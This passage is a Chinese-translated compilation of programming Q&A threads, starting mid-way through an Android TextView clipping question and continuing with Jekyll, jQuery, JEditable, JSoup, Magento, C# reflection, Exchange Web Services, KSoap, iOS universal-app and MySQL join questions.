                android:text="@string/quesiton2_11" android:layout_marginBottom="10dp"/>

            <LinearLayout
                android:id="@+id/ll2_11"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:layout_alignLeft="@+id/textView9"
                android:layout_below="@+id/textView9"
                android:orientation="vertical" android:layout_marginBottom="20dp">

            </LinearLayout>

            <TextView
                android:id="@+id/textView12"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:layout_alignLeft="@+id/textView8"
                android:layout_below="@+id/ll2_11"
                android:text="2.11.1" />

            <TextView
                android:id="@+id/textView13"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:layout_below="@+id/ll2_11"
                android:layout_toRightOf="@+id/textView10"
                android:text="@string/question2_11_1" android:layout_marginBottom="10dp"/>

            <LinearLayout
                android:id="@+id/ll2_11_1"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:layout_below="@+id/textView13"
                android:layout_toRightOf="@+id/textView10"
                android:orientation="vertical" android:layout_marginBottom="20dp">

            </LinearLayout>

        </RelativeLayout>

    </ScrollView>

</RelativeLayout> 
```

* * *

## 回答 #1

> 赞同：268
> 
> 时间：2012-06-28T13:56:36.573

在尝试了一百万种不同的事情之后，我想我有了答案。

我将 a 应用于`LayoutGravity`TextView 项目：

```
android:layout_gravity="fill" 
```

似乎解决了我遇到的所有剪辑问题。希望这可以帮助有同样问题的人。

* * *

## 回答 #2

> 赞同：67
> 
> 时间：2014-06-25T10:36:23.340

我遇到了与屏幕截图所示相同的截止问题。它是由水平方向的基线对齐引起的`LinearLayout`。`TextView`并且`Spinner`由于字体大小不同而具有不同的基线。要解决此问题，需要通过设置禁用布局的基线对齐：

```
android:baselineAligned="false" 
```

或在代码中：

```
layout.setBaselineAligned(false); 
```

* * *

## 回答 #3

> 赞同：34
> 
> 时间：2015-05-27T17:56:49.507

我有同样的问题，发现只需添加

```
android:includeFontPadding="false" 
```

最后一行文本不再被裁剪。

* * *

## 回答 #4

> 赞同：11
> 
> 时间：2014-10-22T09:33:39.237

我通过添加在文本后添加了一些虚拟空间

```
textView.setText(firstString+"\n"); 
```

我尝试了所有其他解决方案。但这是唯一对我有用的解决方案

* * *

## 回答 #5

> 赞同：7
> 
> 时间：2014-11-18T16:10:14.720

我通过扩展 TextView 并添加这样的自定义类找到了不同的解决方案：

```
 public class AdaptingTextView extends TextView {

    public AdaptingTextView(Context context, AttributeSet attrs, int defStyle) {
        super(context, attrs, defStyle);
    }

    public AdaptingTextView(Context context, AttributeSet attrs) {
        super(context, attrs);
    }

    public AdaptingTextView(Context context) {
        super(context);
    }

    @Override
    protected void onSizeChanged(int w, int h, int oldw, int oldh) {
        super.onSizeChanged(w, h, oldw, oldh);

        // set fitting lines to prevent cut text
        int fittingLines = h / this.getLineHeight();
        if (fittingLines > 0) {
            this.setLines(fittingLines);
        }
    }

} 
```

* * *

## 回答 #6

> 赞同：6
> 
> 时间：2017-08-28T17:53:02.280

将有问题的文本视图放在框架布局中。我认为文本视图的计算不正确是因为同级视图 Spinner。

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout
    xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:orientation="horizontal">

    <FrameLayout
        android:layout_width="150dp"
        android:layout_height="wrap_content">
        <TextView
            android:id="@+id/textView1"
            android:layout_width="150dp"
            android:layout_height="wrap_content"
            android:layout_marginRight="20dp"
            android:text="TextView"/>
    </FrameLayout>
    <Spinner
        android:id="@+id/spinner1"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"/>
</LinearLayout> 
```

* * *

## 回答 #7

> 赞同：5
> 
> 时间：2013-12-04T11:39:11.260

发生这种情况时，您应该确保它`TextView`不会比它的容器大 -

如果 a`TextView`设置为`wrap_content`并且它的容器（或祖先容器）没有为它的`TextView`生长留出空间，则它可能会被遮挡。

如果不是这种情况，有时也可能`onMeasure()`无法`TextView`正确测量字母的尾部、非拉丁字符或文本斜体的影响。您可以通过为您的设置全局样式来纠正此问题，`TextView`因此无需更改整个代码库即可将其拾取：

确保您的应用程序/活动使用自定义主题，如下所示：

```
<style name="Custom" parent="@android:style/Theme.Light">   
    <item name="android:textViewStyle">@style/Custom.Widget.TextView</item>
</style>

<style name="Custom.Widget.TextView" parent="@android:style/Widget.TextView"> 
    <item name="android:gravity">fill</item>
    <item name="android:padding">1sp</item>
</style> 
```

@Rynadt 的回答对进入上述阶段非常有帮助。在视图内设置文本的重力可确保在某些设备上永远不会发生遮挡（文本正确地安装在视图内），在其他设备上通过 sp 值的填充来帮助确保尾部等都被考虑在内具有 TextSize 特定值。

* * *

## 回答 #8

> 赞同：5
> 
> 时间：2016-02-11T07:56:13.177

我的解决方案接近接受的解决方案，但我不得不将其更改为

```
 android:layout_gravity="fill_vertical" 
```

反而。否则，其他行也会被拉伸，并在随机位置添加换行符。例如，最大的一行有 4 行，所以另一行从

`this is a testphrase`

到

```
thi
s is
a testph
rase 
```

* * *

## 回答 #9

> 赞同：4
> 
> 时间：2012-06-28T11:49:28.643

尝试删除 android:paddingBottom="20dp"

从

```
 <RelativeLayout
            android:layout_width="fill_parent"
            android:layout_height="wrap_content"
            android:paddingBottom="20dp"
            android:paddingLeft="10dp"
            android:paddingRight="10dp"
            android:paddingTop="10dp" > 
```

* * *

## 回答 #10

> 赞同：4
> 
> 时间：2017-05-19T12:09:27.417

`getViewTreeObserver().addOnGlobalLayoutListener`在回收站视图中不起作用。如果您使用的是回收站，请使用`View.addOnLayoutChangeListener`：

我发现我`textView`在 xml 中定义的省略号并不总是反映，所以我在重新分配 text 属性之前以编程方式设置它。这对我有用。

```
textView.addOnLayoutChangeListener(new OnLayoutChangeListener() {
    @Override
        public void onLayoutChange(View v, int left, int top, int right, int bottom,
                                   int oldLeft, int oldTop, int oldRight, int oldBottom) {
            textView.removeOnLayoutChangeListener(this);
            float lineHeight = textView.getLineHeight();
            int maxLines = (int) (textView.getHeight() / lineHeight);
            if (textView.getLineCount() != maxLines) {
                textView.setLines(maxLines);
                textView.setEllipsize(TextUtils.TruncateAt.END);
                // Re-assign text to ensure ellipsize is performed correctly.
                textView.setText(model.getText());
            }
        }
    }); 
```

* * *

## 回答 #11

> 赞同：3
> 
> 时间：2012-11-08T12:22:45.487

如果您遇到此问题并且您`TextView`在 a`RelativeLayout`中，请尝试切换`RelativeLayout`for a `LinearLayout`。

这为我解决了问题

* * *

## 回答 #12

> 赞同：3
> 
> 时间：2016-03-14T03:22:26.520

您可以在任何类型的 ViewGroup 中为 TextView 使用全局布局侦听器。

```
 final TextView dSTextView = (TextView)findViewById(R.id.annoyingTextView);
dSTextView.getViewTreeObserver().addOnGlobalLayoutListener(new ViewTreeObserver.OnGlobalLayoutListener() {

    @Override
    public void onGlobalLayout() {
        dSTextView.getViewTreeObserver().removeOnGlobalLayoutListener(this);

        float lineHeight = dSTextView.getLineHeight();
        int maxLines = (int) (dSTextView.getHeight() / lineHeight);

        if (dSTextView.getLineCount() != maxLines) {
            dSTextView.setLines(maxLines);
        }

    }
}); 
```

[你可以在这里](http://blog.jimbaca.com/2016/03/14/global-layout-listener-to-the-rescue-how-to-fix-the-textview-cutoff)阅读更多关于它的信息

* * *

## 回答 #13

> 赞同：2
> 
> 时间：2017-08-18T09:44:58.307

我知道已经很晚了，但这对我来说就像是魅​​力一样。将此代码添加到您的`textview`

```
android:ellipsize="marquee"
android:layout_weight="1" 
```

* * *

## 回答 #14

> 赞同：1
> 
> 时间：2012-11-06T10:53:41.307

我也有同样的问题，而且非常烦人。

它只发生在阿拉伯语文本中。

如果您将标签设置为多行并`\n`在字符串的末尾添加 a ，它会修复它，但问题是这个标签与其下面的对象之间会有很大的差距，因为这个字段现在它下面有一个新的空行。

可以做一个自定义控件来解决这个问题。但总的来说，这是一个令人讨厌的错误。

* * *

## 回答 #15

> 赞同：1
> 
> 时间：2016-05-02T12:07:49.567

我认为您几乎无法通过更改布局来完成这项工作。正如我发现的那样，某些方法仅在某些情况下有效。我认为这取决于整个布局层次结构，而不是一刀切的解决方案。我还注意到，尤其是当您要为 TextView 设置不同的字体时会发生这种情况。

我实验和测试过的一个确定的方法是，您可以在视图膨胀后在代码中设置字体属性。我假设您在 assets/fonts 文件夹中有您想要的字体。

例如在片段中：

```
@Override
public View onCreateView(LayoutInflater inflater, ViewGroup container,
        Bundle savedInstanceState)
{
    View view = inflater.inflate(R.layout.fragment_view, container, false);
    TextView tv = (TextView)view.findViewById(R.id.text_view);
    tv.setText("Insert text that needs to be displayed");
    AssetManager assetManager = getContext().getAssets();
    Typeface typeFace = Typeface.createFromAsset(assetManager, "Fonts/OpenSans-Light.ttf");
    tv.setTypeface(typeFace , 0); // 0 is normal font
    tv.setPadding(10,  0, 10, 0); // This is not mandatory
} 
```

在一个活动中：

```
@Override
protected void onCreate(Bundle savedInstanceState) 
{
    super.onCreate(savedInstanceState);
    setContentView(Resource.Layout.main_activity);
    TextView tv = (TextView)this.findViewById(R.id.text_view);
    tv.setText("Insert text that needs to be displayed");
    AssetManager assetManager = getContext().getAssets();
    Typeface typeFace = Typeface.createFromAsset(assetManager, "Fonts/OpenSans-Light.ttf");
    tv.setTypeface(typeFace , 0); // 0 is normal font
    tv.setPadding(10,  0, 10, 0); // This is not mandatory
} 
```

* * *

## 回答 #16

> 赞同：0
> 
> 时间：2014-08-18T07:24:18.380

最好的解决方法是在视图底部添加一个所需高度的虚拟视图（即这将添加填充本身）。

```
<TableRow
 android:layout_width="fill_parent"
 android:layout_height="wrap_content"
 android:layout_marginLeft="5dp"
 android:layout_marginRight="5dp" >
     <View 
       android:layout_width="match_parent" 
       android:layout_height="30dp"/>
</TableRow> 
```

就像在我的情况下，我在视图底部添加了一个表格行。希望这可以帮助某人。

* * *

## 回答 #17

> 赞同：0
> 
> 时间：2019-08-27T23:54:16.010

在文本视图的底部添加填充：

```
android:paddingBottom="24dp" 
```

* * *

## 回答 #18

> 赞同：0
> 
> 时间：2020-09-17T08:08:37.587

我遇到了同样的问题，并找到了一个方便的解决方案。我在渲染后得到TextView的行数，并根据行数设置高度。这是代码。

```
TextView textView = (TextView) layout.findViewById(R.id.textView);
textView.setText(this.text);
textView.post(new Runnable() {
    @Override
    public void run() {
        int linesCount = textView.getLineCount();
        textView.setLines(linesCount);
    }
}); 
```

* * *

## 回答 #19

> 赞同：0
> 
> 时间：2020-10-27T17:56:16.300

对我来说，这个解决方案就像一个魅力。

我的最外层布局的高度和宽度是动态设置的，因此即使我在我的 xml 中设置了 android:maxLines （对于不同的设备，它的行为不同），其中包含的 TextView 也得到了它的文本剪切。

在尝试了不同的方法后，我终于得到了解决我的问题的解决方案。

文本视图：

```
public class CustomTextView extends androidx.appcompat.widget.AppCompatTextView {
    public CustomTextView(Context context, AttributeSet attrs, int defStyle) {
        super(context, attrs, defStyle);
    }
    public CustomTextView(Context context, AttributeSet attrs) {
        super(context, attrs);
    }
    public CustomTextView(Context context) {
        super(context);
    }
    @Override
    protected void onSizeChanged(int w, int h, int oldw, int oldh) {
        super.onSizeChanged(w, h, oldw, oldh);
        // set fitting lines to prevent cut text
        int fittingLines = h / this.getLineHeight();
        if (fittingLines > 0) {
            this.setLines(fittingLines);
            this.setEllipsize(TextUtils.TruncateAt.END);
        }
    }
} 
```

xml:

```
<com.myproject.android.customviews.CustomTextView
    android:id="@+id/tv_partner_description"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:gravity="top"
    android:textColor="@color/white"
    android:textSize="@dimen/text_small_medium" /> 
```

* * *

## 回答 #20

> 赞同：0
> 
> 时间：2021-02-06T11:20:38.947

为特定语言创建主题，如样式-ar，它切断了文本视图：

```
<style name="EnnodaCustomTextView" parent="Widget.AppCompat.TextView">
        <item name="android:paddingTop">1dp</item>
        <item name="android:paddingBottom">1dp</item>
</style> 
```

将它应用到您的 AppTheme 以反映整个应用程序以填充底部，如：

```
 <item name="android:textViewStyle">@style/EnnodaCustomTextView</item> 
```

注意：在默认styles.xml中创建相同的样式名称，没有用于填充的项目标签..（不需要额外的填充）

* * *

## 回答 #21

> 赞同：-1
> 
> 时间：2015-10-01T03:31:06.673

我终于修好了！

我尝试将String添加到**Service**中的TextView ，然后调用scrollTo()，最后一行被截断！

scrollTo() 应该在“Runnable”中调用，例如：

```
private ScrollView mScrollView;
public void scrollToBottom()
{
    mScrollView = (ScrollView) findViewById(R.id.debug_textview_scrollview);
    mScrollView.post(new Runnable()
    {
        public void run()
        {
            mScrollView.fullScroll(View.FOCUS_DOWN);
        }
    });
} 
```

我认为是因为在服务中调用 scrollTo() 的时候，TextView 的更新还没有准备好。

# php - Jekyll 的动态内容

> ID：11243887
> 
> 赞同：7
> 
> 时间：2012-06-28T11:44:00.630
> 
> 标签：php, dynamic, blogs, jekyll

我正在考虑使用 Jekyll 作为即将到来的项目的博客引擎。但是，我需要网站的一小部分是动态的，使用某种服务器端语言（Ruby、PHP、Node.js 等）

我希望帖子像 Jekyll 所期望的那样是静态的，但是在页面底部，我有一段内容需要在每次页面加载时随机旋转。我不想使用 JavaScript 来做到这一点。

这在 Jekyll 中可能吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-17T05:47:01.447

您可以使用[服务器端包含](http://en.wikipedia.org/wiki/Server_Side_Includes). 您可能需要配置服务器或将生成的文件的扩展名更改为 .shtml。

Jekyll 应该在你需要插入动态内容的地方生成这个：

```
<!--#include virtual="dynamic.rb" --> 
```

dynamic.rb 应该产生有效的 html 来显示。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-07T01:38:29.153

如果您根本不想使用 javascript，您可以将动态内容放在不同的服务器上，然后使用 iframe 将其嵌入到您的 jekyll 站点中。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-03T18:42:04.953

不，Jekyll 只创建静态页面。对于任何动态内容，您都必须使用 JavaScript。

# jquery - 更改内容后 jQuery/Javascript 函数不起作用

> ID：11243891
> 
> 赞同：0
> 
> 时间：2012-06-28T11:44:12.877
> 
> 标签：jquery, callback

**

## 我已经通过删除我通过 ajax 调用的页面中的 jQuery 库导入来解决它。感谢你们的帮助！

**

我正在为游戏开发一个管理面板。一切都很好，但我的 js 函数有问题。我有 index.php 和 server.php ......我包括 server.php 和 ajax 回调函数。没关系。我可以检索除**头**标签以外的所有表单内容。我有 script.js 女巫有一些功能。我在两个页面上都添加了脚本。当我用回调更改内容时，server.php 的功能不起作用。

我读过一些关于那个的文章。他们说改变脚本。我已经按照你看到的方式改变了它。它是`$('#dialog_confirm').click`但现在就是这样。我仍然无法使用 server.php 中的函数。当我在没有回调的新选项卡中打开 server.php 时，它可以工作。我能做什么？提前谢谢。

```
$('#dialog_confirm').live("click", function() {
    $.confirm("confirm?", function() {
        $.msg("yes!");
    }, function() {
        $.msg("canceled");
    }); 
```

我使用[它](http://tinywall.info/2012/02/22/change-browser-url-without-page-reload-refresh-with-ajax-request-using-javascript-html5-history-api-php-jquery-like-facebook-github-navigation-menu/)来更改页面内容。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T12:51:06.220

好的，在 ajax 中调用 server.php 然后将返回的数据放入标签调用“#putStuff”的示例

```
$.ajax({
  url: "server.php",
  success: function(data) {
     $('#putStuff').html(data);
  } 
}); 
```

# jeditable - 如何禁用 JEditable 中字段的自动增长？

> ID：11243892
> 
> 赞同：0
> 
> 时间：2012-06-28T11:44:25.183
> 
> 标签：jeditable

我一直在开发应用程序，并为 JEditable 使用以下代码：

```
<script type="text/javascript" charset="utf-8"> 
        $(function() 
        {  
             $(".field").editable("http://"+document.location.host+"/index.php/welcome/update_record", 
             { 
                event  : "mouseover",
                style  : "inherit",
                autogrow: {
                    lineHeight : 0,
                    maxHeight : 0
                },
                submitdata: function (value, settings) {
                            return { "old_value": this.revert};
                },
                callback: function(value, settings) 
                {
                }
            });  
        }); 
```

我需要禁用字段的自动增长，以便如果用户在字段上移动，那么该字段将不会增长。现在，如果用户在它上面移动，字段就会增长。我需要它，请帮忙。非常感谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-23T16:27:58.113

我已经成功使用

宽度：'100%' 作为参数。试试看。

```
<script type="text/javascript" charset="utf-8"> 
        $(function() 
        {  
             $(".field").editable("http://"+document.location.host+"/index.php/welcome/update_record", 
             { 
                event  : "mouseover",
                width     : '100%'
                style  : "inherit",
                autogrow: {
                    lineHeight : 0,
                    maxHeight : 0
                },
                submitdata: function (value, settings) {
                            return { "old_value": this.revert};
                },
                callback: function(value, settings) 
                {
                }
            });  
        }); 
```

# java - JSoup 字符编码问题 #2

> ID：11243896
> 
> 赞同：2
> 
> 时间：2012-06-28T11:44:36.227
> 
> 标签：java, character-encoding, jsoup

我正在构建一个这样的 JSoup 文档：

```
String user_agent = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/A.B     (KHTML, like Gecko) Chrome/X.Y.Z.W Safari/A.B.";
String url = "http://www.ncbi.nlm.nih.gov/pmc/articles/PMC24391/?tool=pubmed";
Document doc = return Jsoup.connect(url).userAgent(user_agent).get(); 
```

然后，我使用保存到文件`doc.toString()`，在保存的文件中我看到字符替换为`?`. 比如`5 μm`会变成`5 ?m`.

如果我更改输出设置以使用 ISO-8859-1 字符集，它似乎没问题。

谁能解释这是为什么？据我了解，原始 html 页面是 UTF-8，这是默认的 Jsoup 编码。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-01T04:39:35.927

对我来说很好。您的问题是在其他地方引起的。

最可能的原因是您没有使用 UTF-8 保存文件。您应该使用[`OutputStreamWriter`](http://docs.oracle.com/javase/7/docs/api/java/io/OutputStreamWriter.html)以指定字符编码将字符写入文件。

```
writer = new OutputStreamWriter(new FileOutputStream(file), "UTF-8"); 
```

此外，您需要确保文件查看器或您在保存文件*后*使用的任何进程也在整个管道中使用 UTF-8。另请参阅[Unicode - 如何正确获取字符？](http://balusc.blogspot.com/2009/05/unicode-how-to-get-characters-right.html)

# php - 属性上的 Magento 类别 id 数组

> ID：11243900
> 
> 赞同：1
> 
> 时间：2012-06-28T11:44:42.703
> 
> 标签：php, magento

我有一个在 Magento 上运行的网站，我在 view.phtml 和 list.phtml 上构建了一些手工代码

```
<?php $category = Mage::getModel('catalog/layer')->getCurrentCategory();?>
<?php if($category->getId()==80): ?>
    Command what to do
<?php else: ?>
    Else command this
<?php endif; ?> 
```

我想做的是在回显之前检查更多类别（例如 80,81 ）。我该如何更改代码？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-28T11:47:21.860

采用[`in_array()`](http://php.net/in_array)

```
<?php if(in_array($category->getId(), array(80, 81, ...))): ?> 
```

如果您想要不同类别的不同代码：

```
<?php if($category->getId()==80): ?>
    ...
<?php elseif($category->getId()==81): ?>
    ... 
```

# c# - 如何在 C# 中读取和设置私有字段而不影响性能？

> ID：11243907
> 
> 赞同：5
> 
> 时间：2012-06-28T11:45:02.323
> 
> 标签：c#, performance, reflection

RavenDB 可以序列化任何给定 C# 对象上的所有公共、私有和受保护属性，即使没有任何序列化属性。

我知道这可以通过反射来完成，但这会产生一些性能问题。还有其他更有效的方法来实现这一目标吗？

要在 .NET 中使用内置序列化，需要注释或实现一些序列化接口，而 RavenDB 可以将任何给定对象序列化到 JSON 和从 JSON 序列化。

我对它使用的技术更感兴趣，而不是 RavenDB。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-29T07:04:20.880

如果通过反射设置属性太慢，您可以生成在运行时设置它们的动态方法。这可以使用`Relection.Emit`或通过创建编译一个`Expression<T>`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T09:07:14.160

向 NHibernate 寻求灵感 - 除了其他替代方案外，它还让您有机会使用接口来表达要保留的属性。在实现接口的底层包装器对象确实进行了更改处理。

参见例如[NHibernate Reflection Optimizer - 它有什么作用？](https://stackoverflow.com/questions/935376/nhibernate-reflection-optimizer-what-does-it-do)

# text - EWS 正文纯文本

> ID：11243911
> 
> 赞同：29
> 
> 时间：2012-06-28T11:45:23.670
> 
> 标签：text, exchange-server, exchangewebservices

我使用 EWS 获取交换电子邮件，但如何从电子邮件正文中获取纯文本，而不使用 html？
现在我用这个：

```
EmailMessage item = (EmailMessage)outbox.Items[i];
item.Load();
item.Body.Text 
```

* * *

## 回答 #1

> 赞同：68
> 
> 时间：2012-06-28T14:07:29.767

在您的项目的 PropertySet 中，您需要将 RequestedBodyType 设置为 BodyType.Text。这是一个例子：

```
PropertySet itempropertyset = new PropertySet(BasePropertySet.FirstClassProperties);
itempropertyset.RequestedBodyType = BodyType.Text;
ItemView itemview = new ItemView(1000);
itemview.PropertySet = itempropertyset;

FindItemsResults<Item> findResults = service.FindItems(WellKnownFolderName.Inbox, "subject:TODO", itemview);
Item item = findResults.FirstOrDefault();
item.Load(itempropertyset);
Console.WriteLine(item.Body); 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-10-22T02:15:50.823

在 powershell 中：

```
 .........    
$message = [Microsoft.Exchange.WebServices.Data.EmailMessage]::Bind($event.MessageData,$itmId)

$PropertySet = New-Object Microsoft.Exchange.WebServices.Data.PropertySet([Microsoft.Exchange.WebServices.Data.BasePropertySet]::FirstClassProperties)
$PropertySet.RequestedBodyType = [Microsoft.Exchange.WebServices.Data.BodyType]::Text
$message.Load($PropertySet)
$bodyText= $message.Body.toString() 
```

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2015-12-09T05:18:51.873

我遇到过同样的问题。您所要做的就是设置您正在使用的属性集的 RequestedBodyType 属性。

```
 PropertySet propSet = new PropertySet(BasePropertySet.IdOnly, EmailMessageSchema.Subject, EmailMessageSchema.Body);
    propSet.RequestedBodyType = BodyType.Text;
    var email = EmailMessage.Bind(service, item.Id, propSet); 
```

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2017-06-06T13:41:47.243

最短的方法是这样的：

```
item.Load(new PropertySet(BasePropertySet.IdOnly, ItemSchema.TextBody, EmailMessageSchema.Body)); 
```

这样做的好处是您可以同时获得 text-body 和 html-body。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2013-02-14T10:38:30.740

您可以使用

```
service.LoadPropertiesForItems(findResults, itempropertyset); 
```

加载所有项目的属性

# android - android KSoap故障异常传参

> ID：11243926
> 
> 赞同：0
> 
> 时间：2012-06-28T11:45:58.227
> 
> 标签：android, web-services

```
public class Result extends Activity {  

   private final String NAMESPACE = "http://tempuri.org/";
   private final String URL = "http://10.101.21.18/MDSService/Service1.svc?wsdl";
   private final String SOAP_ACTION = "http://tempuri.org/IService1/GetAssmtDataByLoginIdAndPassword";
   private final String METHOD_NAME = "GetAssmtDataByLoginIdAndPassword";

   public void onCreate(Bundle savedInstanceState) {
   super.onCreate(savedInstanceState);
      SoapObject soapObject=new SoapObject(NAMESPACE, METHOD_NAME);
      Intent in = getIntent();
      soapObject.addProperty("loginName","ginnas");
      soapObject.addProperty("password","orcas");
     SoapSerializationEnvelope envelope = new SoapSerializationEnvelope(SoapEnvelope.VER11);
     envelope.dotNet = true;
      envelope.setOutputSoapObject(soapObject);
      HttpTransportSE androidHttpTransport = new HttpTransportSE(URL);
      androidHttpTransport.setXmlVersionTag("<?xml version=\"1.0\" encoding=\"UTF-8\"?>");
   try {
       androidHttpTransport.call(SOAP_ACTION, envelope);
       System.out.println("call success");     
       SoapObject soapResponse = (SoapObject)envelope.getResponse();//throws the soap fault exception at this line
       Log.i("myApp", soapResponse.toString());

    } catch (org.xmlpull.v1.XmlPullParserException ex2) {
        System.out.println("EXCEPTION: " + ex2.getMessage());
    } catch (SoapFault e) {
        System.out.println("SOAPFAULT====");
        e.printStackTrace();
    } catch (IOException e) {
        System.out.println("IOEXCEPTION====");
        e.printStackTrace();
    } catch (Exception e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    } 
```

这段代码给了我以下异常：

```
SoapFault - faultcode: 'a:InternalServiceFault' faultstring: 'Query error occured : Procedure or function 'GetResidentAssmtDataByUser' expects parameter '@loginName', which was not supplied.' faultactor: 'null' detail: org.kxml2.kdom.Node@4053c030 
```

登录名和密码正确。

到目前为止我所做的：
Internet 权限
envelop.dotNet=true/false
SoapPrimitive response = (SoapPrimitive)envelope.bodyIn;

但这将给出同样的例外。请解决我的问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T21:35:12.257

```
 public String Convert()
            {
            String result = null;
            try
                {

                    SoapObject request = new SoapObject(NAMESPACE, METHOD_NAME);

                    request.addProperty("loginName","ginnas");
                    request.addProperty("password","orcas");

                    SoapSerializationEnvelope envelope = new SoapSerializationEnvelope(SoapEnvelope.VER11);
                    envelope.dotNet = true;

                    envelope.setOutputSoapObject(request);

                    HttpTransportSE httpTransport = new HttpTransportSE(URL);

                    Object response = null;

                    try
                        {
                            httpTransport.call(SOAP_ACTION, envelope);
                            response = envelope.getResponse();
                            result = response.toString();
                        }
                    catch (Exception exception)
                        {
                            response = exception;
                            result = response.toString();
                        }
                }
            catch (Exception e)
                {
                    System.out.println("Server responce" + e.getMessage());
                }
            return result;
        } 
```

或查看此链接

[http://www.c-sharpcorner.com/UploadFile/88b6e5/how-to-call-web-service-in-android-using-soap/](http://www.c-sharpcorner.com/UploadFile/88b6e5/how-to-call-web-service-in-android-using-soap/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-03T07:02:56.417

您必须检查您在 web 服务中接受的参数名称

soapObject.addProperty("登录名","ginnas"); soapObject.addProperty("密码","orcas");

参数名称必须与 web 服务中给出的名称匹配，例如。在网络服务中

```
GetAssmtDataByLoginIdAndPassword(String @loginName,String @password)//Method in Webservice 
```

然后您可以将值传递为（在android中）

```
soapObject.addProperty("@loginName","ginnas");
  soapObject.addProperty("@password","orcas"); 
```

如果您在 Web 服务中调用存储过程，那么

2）在webservice中，将参数传递给存储过程时检查参数的名称

与前面的示例相同。只需检查参数名称。

如果你觉得很难或有任何其他问题，那么你可以给我写信。

# iphone - 通用IOS应用开发策略

> ID：11243930
> 
> 赞同：0
> 
> 时间：2012-06-28T11:46:19.233
> 
> 标签：iphone, ipad, ios-universal-app

我在 appstore 中有一个 iPhone 应用程序。现在我想开发同一个应用程序的通用版本。当前应用程序的 iPad 版本将是相同的。只是屏幕将适应 iPad 尺寸。该行为不会因设备类型而改变。

我的问题如下： 在 iPhone 版本中，有一个显示酒店列表的页面。控制器类是：

```
HotelListViewController.m
HotelListViewController.h 
```

西布是：`HotelListViewController.xib`

现在这是制作 iPad 相同页面的最佳实践：选项 1：只需创建`HotelListViewControlleriPad.xib` 和使用相同`HotelListViewController.m`的和 .h

选项 2：创建`HotelListViewControlleriPad.xib` 创建`HotelListViewControlleriPad.m`和 h

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-28T11:48:45.160

您需要选择选项 1，因为只有视图不同，因此您需要为 iPhone 和 iPad 使用不同的 xib。

如果在您的控制器中，有某些与视图相关的东西，那么您可以有条件地处理这些东西。

您也可以查看此线程以获取一些感兴趣的相关讨论-[如何在没有 xib 文件的情况下为 iPhone + iPad 开发通用应用程序？](https://stackoverflow.com/questions/3904743/how-to-develop-an-universal-app-for-iphone-ipad-without-xib-files)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-28T11:52:37.497

选择选项 1 或使用与 iPhone 中相同的 xib 和视图控制器类，但使视图控制器成为 iPad 上全屏视图控制器的子视图控制器（例如使用拆分视图控制器或自定义容器视图控制器）。

# php - mySQL 连接功能

> ID：11243933
> 
> 赞同：-1
> 
> 时间：2012-06-28T11:46:33.790
> 
> 标签：php, mysql, join

我正在使用 PHP mySQL 查询。挣扎着加入。

```
mysql_query("SELECT * FROM electors WHERE telephone > 0") 
```

然后我需要它从一个名为voting_intention 的表中进行选择，并从这个查询的选举人表中选择一个匹配的ID，并获得一个名为“质押”的列，该列等于“C”或“D”。

我们如何在 1 个 mySQL 查询中做到这一点。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T11:51:00.010

```
SELECT * FROM electors e
JOIN voting_intention vi ON (e.id = vi.id)
WHERE e.telephone > 0 and
vi.pledge in {'C','D'}; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T11:50:17.620

您可能的 SQL 语句将是，

```
SELECT voting_intention.pledge
FROM electors, voting_intention 
WHERE 
      electors.id =voting_intention.id 
  and electors.telephone > 0 
  and voting_intention.pledge in {'C','D'} 
```

# javascript - HttpContext.User.Identity 的 Safari 问题

> ID：11243934
> 
> 赞同：1
> 
> 时间：2012-06-28T11:46:33.977
> 
> 标签：javascript, jquery, asp.net, asp.net-mvc, html

我尝试通过 html5 音频标签播放 mp3 文件，该文件由 ContentController 的 MyAudio 方法返回。以下代码：

```
[Authorize]
    public class ContentController : Controller
    {

        private ContentServices Content { get; set; }

        protected override void Initialize(RequestContext requestContext)
        {
            if (requestContext.HttpContext.User.Identity.isAuthenticated) 
            {
                base.Initialize(requestContext);
            }

        }

    public ActionResult MyAudio(string name)
    {
        var file = Server.MapPath("~/" + name);
        return File(file, "audio/mp3");
    } 
```

常用的html代码

当用户获得授权时，Chrome 中的一切都可以完美运行。但是当我在 Safari 中对其进行测试时，有一个奇怪的谜团。HttpContext.User.Identity.isAuthenticated 返回 false，当然代码不会进一步执行。

有趣的是，当我使用例如@Html.Action 或@Html.RouteLink 时，HttpContext.User.Identity.isAuthenticated 将返回 true。

我尝试使用 javascript 和 jquery 来解决这个问题，但我在 Safari 上也遇到了一些奇怪的事情。

```
<script type="text/javascript">
        function getAudio() {
            if (audio.src == "" || audio.src == null) {
                // (1) audio.src = '@Url.Content("~/Content/MyAudio")' + "hello.mp3";
                // (2) audio.src = '@Url.Action("MyAudio", "Content", new { name = "hello.mp3" } )';
